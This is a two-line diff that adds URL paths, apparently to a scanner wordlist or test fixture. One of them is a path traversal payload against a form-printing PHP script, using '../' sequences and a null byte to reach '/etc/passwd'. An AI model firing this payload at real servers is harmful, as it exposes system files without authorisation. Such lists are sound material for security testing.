@@ -1,0 +1,2 @@
+/contrib/acog/print_form.php?formname=../../../etc/passwd%00
+/interface/login/login.php?site=default
